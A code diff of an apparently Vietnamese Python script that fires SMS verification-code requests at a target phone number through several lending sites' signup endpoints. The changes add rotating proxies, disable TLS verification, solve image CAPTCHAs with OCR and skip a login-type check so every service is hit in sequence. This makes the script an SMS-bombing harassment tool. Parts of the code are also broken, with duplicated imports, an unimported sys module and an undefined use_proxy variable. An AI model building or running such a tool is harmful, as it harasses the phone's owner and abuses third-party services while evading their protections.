@@ -1,9 +1,10 @@
-import re
+
 import os
+import re
+import random
 import requests
 import time
 import uuid
-import random
 import base64
 import hashlib
 import json
@@ -16,11 +17,30 @@ from Crypto.Util.Padding import pad, unpad
 from PIL import ImageFile, Image, ImageEnhance
 import ddddocr
 
-# Pillow's type stubs mark this flag as Literal[False], but the runtime flag
-# is intentionally mutable to allow loading truncated images.
-setattr(ImageFile, "LOAD_TRUNCATED_IMAGES", True)
+ImageFile.LOAD_TRUNCATED_IMAGES = True
 _ocr = ddddocr.DdddOcr(show_ad=False)
 
+import base64
+import json
+import random
+import requests
+
+from urllib.parse import urlparse
+from Crypto.Cipher import AES, PKCS1_v1_5 as RSA_PKCS1
+from Crypto.PublicKey import RSA
+
+import base64
+import json
+import random
+from urllib.parse import urlparse
+
+import requests
+from Crypto.Cipher import AES
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_v1_5 as RSA_PKCS1
+
+
+_PROXY_FILE = "proxies.txt"
 
 
 _BANANA_RSA_PUB = RSA.import_key(
@@ -45,6 +65,37 @@ def _banana_rnd_key():
             k=16,
         )
     )
+def _load_proxy():
+    """Đọc proxy từ proxies.txt. Không có proxy thì trả None."""
+    try:
+        with open(_PROXY_FILE, "r", encoding="utf-8") as f:
+            proxies = [
+                line.strip()
+                for line in f
+                if line.strip() and not line.lstrip().startswith("#")
+            ]
+
+        if not proxies:
+            return None
+
+        return random.choice(proxies)
+
+    except FileNotFoundError:
+        return None
+
+    except Exception as e:
+        print(f"[PROXY] ERR {type(e).__name__}: {e}")
+        return None
+
+
+def _proxy_dict(proxy):
+    if not proxy:
+        return None
+
+    return {
+        "http": proxy,
+        "https": proxy,
+    }
 
 
 def _banana_send(
@@ -95,19 +146,17 @@ def _banana_send(
 
     event_url = f"{origin}/app-domain/api/burying/unauthenticated/event"
 
-    proxies = None
-
-    # Nếu project của bạn có proxy riêng thì gán proxies ở đây.
-    # use_proxy=False => requests đi thẳng.
-    if not use_proxy:
-        proxies = {
-            "http": None,
-            "https": None,
-        }
+    proxy = _load_proxy() if use_proxy else None
+    proxies = _proxy_dict(proxy)
 
     try:
         with requests.Session() as session:
-            session.verify = True
+            session.verify = False
+
+            if proxy:
+                print(f"[{label}] Proxy: {proxy}")
+            else:
+                print(f"[{label}] Direct")
 
             # Request event
             try:
@@ -146,7 +195,7 @@ def _banana_send(
                             "loanProductName": loan_name,
                         },
                         k2,
-                    )
+                    ),
                 },
                 timeout=20,
                 proxies=proxies,
@@ -173,6 +222,21 @@ def _banana_send(
         return ok
 
     except Exception as e:
+        # Proxy lỗi → thử lại trực tiếp
+        if proxy:
+            print(
+                f"[{label}] Proxy lỗi "
+                f"{type(e).__name__}: {e} -> Direct"
+            )
+
+            return _banana_send(
+                phone,
+                url,
+                loan_name,
+                label,
+                use_proxy=False,
+            )
+
         print(f"[{label}] ERR {type(e).__name__}: {e}")
         return False
 
@@ -182,9 +246,7 @@ def sent(phone):
         "https://www.fvbanana.top/app-domain/api/user/sentSms",
         "Fast_Vay",
         "Thành Công",
-    ) 
-
-
+    )        
 
 def mfast_1(phone):
     url = "https://appay.cloudcms.vn/mfast/potential_customer/ajax_confirm_phone"
@@ -225,7 +287,7 @@ def mfast_1(phone):
 
 
 def mfast(phone):
-    phone_number = "84" + phone[1:] if phone.startswith("0") else phone   
+    phone = "84" + phone[1:] if phone.startswith("0") else phone    
     url = "https://appay.cloudcms.vn/mfast/potential_customer/ajax_confirm_phone"
 
     headers = {
@@ -242,7 +304,7 @@ def mfast(phone):
     }
 
     data = {
-        "phone": phone_number,
+        "phone": phone,
         "type": "phone",
         "code": "891234",
     }
@@ -300,6 +362,7 @@ def call1(phone):
             if response.status_code != 200:
                 return check_data
 
+            # Request 2: send code
             response = session.get(
                 f"{base_url}/api/scone-app/register/send/code/Vidutru",
                 params={
@@ -352,7 +415,6 @@ def tiennhanh_check(phone):
     data = {
         "phone": phone,
     }
-
     try:
         r = requests.post(
             url,
@@ -375,7 +437,7 @@ def tiennhanh_check(phone):
         print(f"[CHECK][Thất Bại] {type(e).__name__}: {e}")
         return {}
 
-def tiennhanh_send(phone):
+def tiennhanh_send(phone, use_proxy: bool = True):
     url = "https://tiennhanh.xyz/api/scone-app/register/send/code/TNhanhPay"
 
     headers = {
@@ -402,6 +464,8 @@ def tiennhanh_send(phone):
         "App-Version": "1.0.0",
         "Sec-Fetch-Mode": "cors",
     }
+    proxy = _load_proxy() if use_proxy else None
+    proxies = _proxy_dict(proxy)
 
     params = {
         "phone": phone,
@@ -413,6 +477,7 @@ def tiennhanh_send(phone):
             url,
             headers=headers,
             params=params,
+            proxies=proxies,
             timeout=20,
         )
         if r.ok:
@@ -435,7 +500,6 @@ FINGERPRINT_ORIGIN = "https://dfp-vn.xuanjirc.com"
 FINGERPRINT_ORGANIZATION = "2022072009308201"
 PRODUCT_ID = "20003"
 CHANNEL_CODE = "H1h82"
-APP_VERSION = "3.1.9"
 SALT_TTL_MS = 10_000
 
 USER_AGENT = os.getenv(
@@ -620,15 +684,13 @@ def _base_payload(phone: str, biz_params: dict[str, Any]) -> dict[str, Any]:
             "deviceType": "h5",
             "deviceIdKh": fingerprint,
             "termSysVersion": "18.1",
-            # The H5 bundle only extracts a model when the UA contains an
-            # identifier such as "iPhone15,2"; the Safari UA above does not.
-            "termModel": "",
+            "termModel": "iPhone",
             "brand": "Apple Computer, Inc.",
             "isPwa": 0,
             "imei": "",
             "termId": None,
             "appType": "6",
-            "appVersion": APP_VERSION,
+            "appVersion": "3.1.7",
             "pValue": "",
             "lon": "",
             "lat": "",
@@ -639,10 +701,7 @@ def _base_payload(phone: str, biz_params: dict[str, Any]) -> dict[str, Any]:
         },
         "clientTypeFlag": "h5",
         "token": "",
-        # The web client reads this from cookie/localStorage.  During the
-        # pre-login flow it is empty; the submitted number remains in
-        # bizParams.phoneNum.
-        "phoneNumber": "",
+        "phoneNumber": phone,
         "timestamp": str(int(time.time() * 1000)),
         "bizParams": biz_params,
     }
@@ -720,69 +779,19 @@ def _solve_captcha(image_bytes: bytes) -> str:
             ImageEnhance.Contrast(image.convert("L").convert("RGB")).enhance(3.0)
         ),
     ]
-    cleaned = [
-        re.sub(r"[^A-Za-z0-9]", "", item)
-        for item in candidates
-    ]
-    valid = [item for item in cleaned if 4 <= len(item) <= 8]
-    if not valid:
-        longest = ""
-        for item in cleaned:
-            if len(item) > len(longest):
-                longest = item
-        return longest
-
-    # Nếu nhiều biến thể OCR đồng ý, ưu tiên kết quả lặp lại.
-    counts = {item: valid.count(item) for item in set(valid)}
-    repeated = [item for item in valid if counts[item] >= 2]
-    if repeated:
-        best = ""
-        best_count = -1
-        for item in repeated:
-            count = counts[item]
-            if count > best_count or (
-                count == best_count and len(item) > len(best)
-            ):
-                best = item
-                best_count = count
-        return best
-    longest = ""
-    for item in valid:
-        if len(item) > len(longest):
-            longest = item
-    return longest
+    return next((item for item in candidates if len(item) >= 4), max(candidates, key=len, default=""))
 
 
 def send_sms_code(phone: str, code: str | None = None) -> bool:
-    phone = phone.strip()
-    if phone.startswith("+84"):
-        phone = "0" + phone[3:]
-    elif phone.startswith("84"):
-        phone = "0" + phone[2:]
-    elif not phone.startswith("0"):
-        phone = "0" + phone
+    phone = "84" + phone[1:] if phone.startswith("0") else phone
 
-    # The H5 flow always performs this check before displaying the image
-    # CAPTCHA or sending the SMS request.
-    login_type = get_login_type(phone)
-    need_validate_code = True
-    if isinstance(login_type, dict) and login_type.get("success") is True:
-        data = login_type.get("data")
-        if isinstance(data, dict):
-            need_validate_code = bool(data.get("needValidateCode"))
-            print(
-                "[SendSMS] getLoginType needValidateCode="
-                f"{need_validate_code}"
-            )
-
-    if not code and need_validate_code:
+    if not code:
         image = get_validate_code(phone)
         if not image:
             raise RuntimeError("Không lấy được ảnh mã xác nhận")
         code = _solve_captcha(image)
         if not code:
             raise RuntimeError("Không đọc được mã xác nhận")
-        print(f"[SendSMS] OCR đã chọn mã có {len(code)} ký tự")
 
     payload = _base_payload(
         phone,
@@ -821,16 +830,20 @@ def tientay24(phone: str):
         "Referer": "https://h5app.tientay24.com/",
         "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
     }
+    proxy = _load_proxy() if use_proxy else None
+    proxies = _proxy_dict(proxy)
+
     payload = {
         "mobileNo": phone,
-        "smsType": 2,
+        "smsType": 1,
     }
+
     try:
         r = requests.post(
             url,
             headers=headers,
             json=payload,
-            timeout=15,
+            proxies=proxies,
         )
 
         data = r.json()
@@ -848,37 +861,50 @@ def tientay24(phone: str):
         print(f"[Tientay24] ERR {type(e).__name__}: {e}")
         return False
 
+
 if __name__ == "__main__":
-    phone = "0983286226"
+    if len(sys.argv) < 2:
+        print("Usage: python3 main.py 0983286226")
+        sys.exit(1)
+
+    phone = sys.argv[1]
 
     print("=== TEST ===")
-
 
     print("\n[1] FVbanana")
     print(sent(phone))
 
+    time.sleep(20)
 
-    print("\n[1] mfast_1")
+    print("\n[2] mfast_1")
     print(mfast_1(phone))
 
+    time.sleep(20)
 
     print("\n[3] call1")
     print(call1(phone))
 
+    time.sleep(20)
 
-    print("\n[2] mfast")
+    print("\n[4] mfast")
     print(mfast(phone))
 
+    time.sleep(20)
 
-    print("\n[4] tiennhanh_check")
+    print("\n[5] tiennhanh_check")
     print(tiennhanh_check(phone))
 
-    print("\n[5] tiennhanh_send")
+    time.sleep(20)
+
+    print("\n[6] tiennhanh_send")
     print(tiennhanh_send(phone))
 
+    time.sleep(20)
 
-    print("\n[4] tientay_check")
+    print("\n[7] tientay_check")
     print(tientay24(phone))
 
-    print("\n[5] fistgo_send")
+    time.sleep(20)
+
+    print("\n[8] fistgo_send")
     print(send_sms_code(phone))
